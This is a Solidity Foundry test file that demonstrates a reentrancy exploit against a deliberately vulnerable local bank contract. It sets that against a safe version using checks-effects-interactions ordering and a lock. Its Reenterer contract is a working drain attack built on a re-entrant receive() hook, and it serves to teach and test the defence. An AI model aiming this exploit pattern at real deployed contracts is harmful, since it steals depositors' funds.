// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableBank, SafeBank} from "../src/reentrancy/Bank.sol";

/// PoC for state-changing CEI reentrancy.
///   forge test --match-contract CeiReentrancy -vvv
///
/// Invariant (SC08): a balance/effect must be finalized before any external call, so a re-entrant
/// call cannot observe stale state. The vulnerable bank sends before decrementing; CEI ordering +
/// a reentrancy lock hold.
///
/// See docs/exploits/cei-reentrancy.md
contract Reenterer {
    VulnerableBank bank;
    uint256 unit;

    function attack(VulnerableBank b) external payable {
        bank = b;
        unit = msg.value;
        bank.deposit{value: msg.value}();
        bank.withdraw(unit);
    }

    receive() external payable {
        if (address(bank).balance >= unit) {
            bank.withdraw(unit);
        }
    }
}

contract SafeReenterer {
    SafeBank bank;
    uint256 unit;

    function attack(SafeBank b) external payable {
        bank = b;
        unit = msg.value;
        bank.deposit{value: msg.value}();
        bank.withdraw(unit);
    }

    receive() external payable {
        if (address(bank).balance >= unit) {
            bank.withdraw(unit); // reverts under the lock -> bubbles up
        }
    }
}

contract CeiReentrancyTest is Test {
    address victim = makeAddr("victim");

    function test_vulnerable_reentrancyDrains() public {
        VulnerableBank bank = new VulnerableBank();
        // victim's funds in the bank
        vm.deal(victim, 5 ether);
        vm.prank(victim);
        bank.deposit{value: 5 ether}();

        Reenterer att = new Reenterer();
        vm.deal(address(this), 1 ether);
        att.attack{value: 1 ether}(bank);

        assertEq(address(bank).balance, 0, "bank fully drained via reentrancy");
        assertEq(address(att).balance, 6 ether, "attacker took deposit + victim's funds");
    }

    function test_safe_lockBlocksReentrancy() public {
        SafeBank bank = new SafeBank();
        vm.deal(victim, 5 ether);
        vm.prank(victim);
        bank.deposit{value: 5 ether}();

        SafeReenterer att = new SafeReenterer();
        vm.deal(address(this), 1 ether);

        // The re-entrant withdraw reverts under the lock, bubbling up to revert the whole attack tx
        // (the attacker's deposit rolls back with it).
        vm.expectRevert();
        att.attack{value: 1 ether}(bank);

        assertEq(address(bank).balance, 5 ether, "only the victim's funds remain; attack reverted atomically");
    }

    function test_safe_allowsNormalWithdraw() public {
        SafeBank bank = new SafeBank();
        address user = makeAddr("user");
        vm.deal(user, 1 ether);
        vm.startPrank(user);
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
        vm.stopPrank();
        assertEq(user.balance, 1 ether, "honest withdraw still works under the lock");
    }
}
